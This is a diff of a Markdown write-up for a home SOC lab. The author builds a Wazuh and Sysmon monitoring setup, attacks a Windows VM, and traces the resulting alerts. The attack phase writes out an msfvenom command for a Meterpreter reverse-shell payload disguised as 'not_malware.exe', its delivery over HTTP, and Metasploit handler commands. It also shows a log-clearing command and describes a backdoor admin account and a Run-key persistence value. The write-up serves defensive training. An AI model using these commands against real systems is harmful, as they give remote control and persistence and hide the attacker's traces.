@@ -66,76 +66,74 @@ Before simulating any attacks, I built the detection platform from scratch. Buil
 
 ### Step 1: Prepare the Ubuntu Manager
 
-[SCREENSHOT 01]
+![Package installation complete](screenshots/screenshot-01-package-update.png)
 
 Updated package lists and installed the prerequisites Wazuh needs (curl,
 apt-transport-https, unzip, wget, gnupg, etc.) before running the installer.
 Getting this clean up front avoids dependency errors halfway through the
 Wazuh install.
 
-### Step 2 — Install Wazuh (Manager, Indexer, Dashboard)
+### Step 2: Install Wazuh (Manager, Indexer, Dashboard)
 
-[SCREENSHOT 02 — blur the password before sharing]
+![Wazuh installation complete with credentials](screenshots/screenshot-02-wazuh-install-credentials.png)
 
 Ran the all-in-one Wazuh installer, which set up the manager, indexer, and
 dashboard together and printed the auto-generated `admin` credentials for
-the web interface. I saved these immediately — they're only shown once.
+the web interface.
 
-### Step 3 — Verify All Services Are Running
+### Step 3: Verify All Services Are Running
 
-[SCREENSHOT 03]
+![All three Wazuh services active](screenshots/screenshot-03-wazuh-services-active.png.png)
 
 Checked `systemctl status` for `wazuh-manager`, `wazuh-indexer`, and
-`wazuh-dashboard` — all three showed **Active (running)**. If any of these
-fail to start, nothing downstream (agents, alerts, dashboard) will work, so
-this was my first sanity check.
+`wazuh-dashboard`, all three showed **Active (running)**. 
 
-### Step 4 — Confirm Dashboard Access
+### Step 4: Confirm Dashboard Access
 
-[SCREENSHOT 04]
+![Wazuh dashboard loaded — zero agents](screenshots/screenshot-04-dashboard-zero-agents.png)
 
 Logged into the Wazuh dashboard at `https://192.168.56.10` as `admin`. At
-this point it shows **0 agents** — the manager is alive, but it isn't
+this point, it shows **0 agents**, the manager is alive, but it isn't
 watching anything yet.
 
-### Step 5 — Download the Windows Agent
+### Step 5: Download the Windows Agent
 
-[SCREENSHOT 05]
+![Wazuh agent MSI downloaded](screenshots/screenshot-05-agent-msi-downloaded.png)
 
-Downloaded `wazuh-agent-4.7.0-1.msi` onto the Windows 11 VM — this is the
+Downloaded `wazuh-agent-4.7.0-1.msi` onto the Windows 11 VM. This is the
 package that turns a plain Windows machine into a monitored endpoint.
 
-### Step 6 — Install and Start the Agent
+### Step 6: Install and Start the Agent
 
-[SCREENSHOT 06]
+![Agent installed and service started](screenshots/screenshot-06-agent-install-powershell.png)
 
 Ran the MSI silently with `WAZUH_MANAGER` pointed at the manager and
 `WAZUH_AGENT_NAME="Windows-Endpoint"`, then started the service with
-`NET START WazuhSvc`. The service started successfully — the endpoint is now
+`NET START WazuhSvc`. The service started successfully, and the endpoint is now
 shipping telemetry to the manager.
 
-### Step 7 — Confirm the Agent Checks In
+### Step 7: Confirm the Agent Checks In
 
-[SCREENSHOT 07]
+![Windows-Endpoint showing as Active in Wazuh](screenshots/screenshot-07-agent-active.png)
 
 Back on the dashboard's Agents page, **Windows-Endpoint** appears as
 **Active**, with its IP (192.168.56.20) and OS version visible. This is the
 moment the manager and endpoint are officially talking.
 
-### Step 8 — Add Sysmon and Active Response Logging to ossec.conf
+### Step 8: Add Sysmon and Active Response Logging to ossec.conf
 
-[SCREENSHOT 08]
+![ossec.conf with Sysmon and System log entries added](screenshots/screenshot-08-ossec-conf-sysmon.png)
 
 Edited `ossec.conf` on the agent side to add three `<localfile>` blocks: the
 Windows **System** event channel, the **Sysmon Operational** channel, and
-the **active-responses.log** file. Without the Sysmon block specifically,
-Wazuh only sees the generic Windows Security/Application logs — adding it is
-what lets Wazuh see process creation, registry changes, and network
-connections at the level of detail used in Phase 2.
+the **active-responses.log** file. 
 
-### Step 9 — Install Sysmon
+Without the Sysmon block specifically, Wazuh only sees the generic Windows Security/Application logs, adding it is
+what lets Wazuh see process creation, registry changes, and network connections.
 
-[SCREENSHOT 09]
+### Step 9: Install Sysmon
+
+![Sysmon64 service running](screenshots/screenshot-09-sysmon-running.png)
 
 Installed Sysmon64 using a SwiftOnSecurity-based configuration
 (`sysmonconfig-export.xml`) and confirmed the `Sysmon64` service shows
@@ -143,25 +141,24 @@ Installed Sysmon64 using a SwiftOnSecurity-based configuration
 in Phase 2 (process creation, registry SetValue, etc.) rich enough to be
 useful instead of just noise.
 
-### Step 10 — Baseline Check
+### Step 10: Baseline Check
 
-[SCREENSHOT 10]
+![Clean baseline — no high severity alerts](screenshots/screenshot-10-clean-baseline.png)
 
-With everything installed but before any attack, the Security Events
+With everything installed, but before any attack, the Security Events
 dashboard shows 499 total events over 24 hours, **0** alerts at Level 12 or
 above, and a Top 5 Alerts breakdown dominated by routine items (service
-start-type changes, software protection scheduling). This is what "normal"
-looks like — the baseline I'd compare every later alert against.
+start-type changes, software protection scheduling). This is what "normal" looks like, the baseline I'd compare every later alert against.
 
 ---
 
-## PHASE 1 — OFFENSIVE: ATTACK SIMULATION
+## PHASE 1: OFFENSIVE: ATTACK SIMULATION
 
 I switched to the attacker's seat, operating from the Ubuntu VM.
 
-### Step 1 — Generate and Deliver the Payload
+### Step 1:  Generate and Deliver the Payload
 
-[SCREENSHOT — payload creation]
+![Payload generated with msfvenom](screenshots/payload-creation.png)
 
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f exe -o not_malware.exe
@@ -169,20 +166,14 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -
 
 This generated a 7,680-byte Windows x64 Meterpreter reverse TCP payload.
 
-[SCREENSHOT — HTTP delivery]
+![Payload served over HTTP and downloaded by victim](screenshots/http-delivery.png)
 
 ```bash
 sudo python3 -m http.server 80
 ```
+I served the payload from a `/malware/` directory over port 80 using `sudo python3 -m http.server 80`. The access log shows the victim browsing to the directory and downloading `not_malware.exe`.
 
-I served the payload from a `/malware/` directory over port 80 (binding to
-ports below 1024 requires root, hence `sudo`) — using port 80 instead of a
-high port like 8000 makes the delivery link look like a normal website
-rather than an obvious test server, closer to a real phishing scenario. The
-access log shows the victim browsing to `/malware/` and pulling down
-`not_malware.exe`.
-
-### Step 2 — Establish C2 Connection
+### Step 2: Establish C2 Connection
 
 ```bash
 use exploit/multi/handler
@@ -192,12 +183,12 @@ set LPORT 4444
 run
 ```
 
-The moment the victim ran `not_malware.exe`, a Meterpreter session opened —
+The moment the victim ran `not_malware.exe`, a Meterpreter session opened,
 full remote access to the Windows machine.
 
-### Step 3 — Post-Exploitation Attack Chain
+### Step 3: Post-Exploitation Attack Chain
 
-[SCREENSHOT — post-exploitation cmd]
+![Post-exploitation attack chain executed from CMD](screenshots/screenshot-11-app-crash-not-malware.png)
 
 With access established, I ran five attacker actions from a command prompt
 on the victim:
@@ -226,75 +217,59 @@ wevtutil cl System
 
 ---
 
-## PHASE 2 — DEFENSIVE: SOC INVESTIGATION
+## PHASE 2: DEFENSIVE: SOC INVESTIGATION
 
 I switched roles. I'm now the analyst who's been handed this machine and told
-something suspicious happened — with no prior knowledge of what the attacker
+something suspicious happened, with no prior knowledge of what the attacker
 did. Everything below is what I found in Wazuh alone.
 
 ---
 
-### Finding 1 — First Trace: Application Crash on Execution
+### Finding 1: First Trace:  Malware Execution Detected
 
-[SCREENSHOT 11]
+![Finding 1 — Application crash on not_malware.exe execution](screenshots/screenshot-11-app-crash-not-malware.png)
 
-The first artifact tied to the attack is a **Level 0** "Windows application
-error event" (Rule 60602) — `not_malware.exe` faulted with exception code
-`0xc0000005` (access violation) and was logged at 01:47 UTC. On its own this
-is informational, not a detection — but it's the earliest timestamp Wazuh
-has for `not_malware.exe` ever touching this machine, and it tells me the
-binary crashed shortly after execution (consistent with an EDR or AV
-interfering with a Meterpreter stager). Low severity, high forensic value.
+Wazuh flagged **```not_malware.exe```** as a faulting application with exception code 0xc0000005 (access violation). The alert captured the full file path **```C:\Users\Effizy\Downloads\not_malware.exe```** and generated a severity 9 alert automatically without me running a single manual command. Wazuh also recorded the SHA256 hash, module version, and fault offset, giving me immediate forensic anchors to work from.
+This is EDR behaviour: continuous monitoring, catching the malware the moment it runs.
 
 ---
 
-### Finding 2 — Sysmon: Suspicious Process Creation (svchost.exe)
+### Finding 2: Sysmon Suspicious Process Creation (T1055) (svchost.exe)
 
-[SCREENSHOT 12]
+![Finding 2 — Sysmon suspicious svchost.exe process creation](screenshots/screenshot-12-sysmon-svchost-injection.png)
 
-**Rule 61618, Level 12, Technique T1055 (Process Injection).** Sysmon Event
-ID 1 caught `svchost.exe` being spawned with the command line
-`svchost.exe -k netsvcs -p -s gpsvc` and a **null parent process GUID** —
-`svchost.exe` should always have a traceable parent (normally `services.exe`),
-so a null parent GUID combined with a `ParentProcessId` that doesn't line up
-is a strong indicator of process injection. Wazuh's rule engine flagged this
-automatically and captured the full command line, image path, and file
-hashes for follow-up (e.g. VirusTotal lookup).
+Sysmon Event ID 1 captured a suspicious process creation **```svchost.exe```** running with a null parent process GUID, triggering MITRE T1055 (Process Injection) at severity 12. Wazuh's rule engine identified that svchost.exe with no traceable parent is consistent with process injection, an attacker technique used to hide malicious code inside legitimate Windows processes.
+
+Key fields captured: SHA256 hash, parent process GUID (00000000-0000-0000-0000-000000000000), image path, and integrity level.
 
 ---
 
-### Finding 3 — Backdoor Account Created
+### Finding 3: Backdoor Account Created (Event ID 4720
 
-[SCREENSHOT 13]
+![Finding 3 — Backdoor account WazuhTestBackdoor created](screenshots/screenshot-13-account-created.png.png)
 
-**Rule 60109, Level 8, Technique T1098.** Wazuh detected a new local account,
-`WazuhTestBackdoor`, being enabled/created. In a real environment this is the
-point I'd immediately check change-management tickets — no ticket means
-unauthorised account creation, and that alone is enough to open an incident.
+Wazuh detected a new local user account **```WazuhTestBackdoor```**  being created by the **```Effizy```**  account on **```DESKTOP-GACUCML.```** Event ID 4720 fired automatically at severity 8 under MITRE T1098 (Persistence). 
 
 ---
 
-### Finding 4 — Privilege Escalation: Administrators Group Modified
+### Finding 4: Privilege Escalation (Event ID 4732): Administrators Group Modified
 
-[SCREENSHOT 14]
+![Finding 4 — WazuhTestBackdoor added to Administrators group](screenshots/screenshot-14-admin-group-changed.png)
 
-**Rule 60154, Level 12, Technique T1484 (Domain Policy Modification),
-Event ID 4732.** Within seconds of the account being created,
-`WazuhTestBackdoor` was added to the local **Administrators** group by
-`Effizy`. A brand-new account being escalated to admin within seconds of
-creation is a classic attacker pattern — no legitimate provisioning process
-moves that fast. Findings 3 and 4 together are enough on their own to declare
-an incident.
+Within seconds of the account being created, Event ID 4732 fired **```WazuhTestBackdoor```** was added to the local Administrators group. Technique T1484, severity 12, tactic: Defence Evasion + Privilege Escalation. The description reads: "Administrators group changed."
+
+The 4720 followed immediately by 4732 is a classic attacker pattern: create a backdoor account and immediately escalate it. No legitimate IT process moves that fast. This sequence alone is enough to declare an incident.
 
 ---
 
-### Finding 5 — Persistence via Registry Run Key
+### Finding 5: Registry Persistence Captured (Sysmon Event ID 13)
 
-[SCREENSHOT 15]
+![Finding 5 — Registry Run key persistence written by reg.exe](screenshots/screenshot-15-registry-run-key.png)
 
-**Rule 92302, Level 8, Technique T1547.001, Sysmon Event ID 13
-(RegistryEvent: SetValue).** Sysmon caught `reg.exe` writing a new value,
-`SystemUpdateHelper`, under
+Wazuh captured the Sysmon registry modification event (Event ID 13) showing the exact Run key path and the malicious value being written. Rule ID 92302, severity 8, technique T1547.001. The full registry target object was:
+
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemUpdateHelper
+
 `HKU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, pointing at
 `C:\Users\Effizy\Downloads\not_malware.exe`. This is the persistence
 mechanism that would re-launch the payload on every logon — and it was
